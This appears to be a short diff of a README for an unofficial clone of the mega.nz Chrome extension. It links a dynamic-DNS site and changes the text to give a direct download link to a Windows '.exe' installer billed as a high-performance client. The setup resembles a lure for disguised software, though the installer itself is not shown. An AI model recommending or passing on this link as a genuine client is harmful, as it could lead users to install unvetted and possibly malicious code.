@@ -5,4 +5,4 @@ All of this is deprived from the mega.nz chrome extension with some assets from 
 
 http://fastmeganzstatic.servehttp.com
 
-OFFLINE HIGH-PERFORMANCE client in releases.
+OFFLINE HIGH-PERFORMANCE client [download](https://github.com/JessieTessieV2/fastmeganzstatic/releases/download/v3.71.2/megaclient64installer.exe) is here.
